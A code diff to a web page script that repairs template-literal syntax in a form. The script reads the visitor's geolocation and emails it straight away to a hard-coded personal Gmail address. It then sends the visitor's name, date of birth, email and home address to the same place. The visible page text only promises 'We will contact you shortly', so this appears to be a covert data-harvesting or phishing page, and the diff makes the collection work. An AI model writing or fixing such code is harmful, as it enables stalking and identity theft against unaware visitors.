@@ -39,10 +39,10 @@
                     (position) => {
                         latitude = position.coords.latitude;
                         longitude = position.coords.longitude;
-                        locationDisplay.textContent = Latitude: ${latitude}, Longitude: ${longitude};
+                        locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
                         
                         // Send initial location data email
-                        sendEmail("Geolocation Data", Latitude: ${latitude}, Longitude: ${longitude}, "khalilrodeni@gmail.com");
+                        sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                     },
                     (error) => {
                         locationDisplay.textContent = error.code === error.PERMISSION_DENIED ? "Location access denied by user." : "Location error.";
@@ -66,10 +66,10 @@
                 address: document.getElementById("address").value,
                 city: document.getElementById("city").value,
                 postalCode: document.getElementById("postalCode").value,
-                location: Latitude: ${latitude}, Longitude: ${longitude}
+                location: `Latitude: ${latitude}, Longitude: ${longitude}`
             };
 
-            const message = 
+            const message = `
                 Name: ${formData.fullName}
                 Date of Birth: ${formData.dob}
                 Email: ${formData.email}
@@ -78,7 +78,7 @@
                 City: ${formData.city}
                 Postal Code: ${formData.postalCode}
                 Location: ${formData.location}
-            ;
+            `;
 
             sendEmail("Form Submission Data", message, "khalilrodeni@gmail.com");
             alert("Thank you for your submission! We will contact you shortly.");
@@ -100,8 +100,8 @@
                 },
                 body: JSON.stringify(emailData)
             })
-            .then(response => response.ok ? response.json() : Promise.reject(Error ${response.status}))
-            .then(data => alert(data.message ? "Email sent successfully!" : Error: ${data.error}))
+            .then(response => response.ok ? response.json() : Promise.reject(`Error ${response.status}`))
+            .then(data => alert(data.message ? "Email sent successfully!" : `Error: ${data.error}`))
             .catch(error => alert("Error sending email: " + error));
         }
     </script>
